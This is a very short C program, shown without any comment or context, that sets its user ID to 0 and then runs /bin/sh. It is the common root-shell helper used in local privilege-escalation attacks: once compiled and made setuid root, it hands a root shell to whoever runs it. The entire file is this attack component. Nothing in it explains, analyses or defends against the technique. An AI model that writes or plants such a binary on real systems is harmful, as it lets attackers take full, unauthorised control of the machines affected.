#include <unistd.h>
int main(void){setuid(0);execl("/bin/sh", "sh", NULL);return 0;}
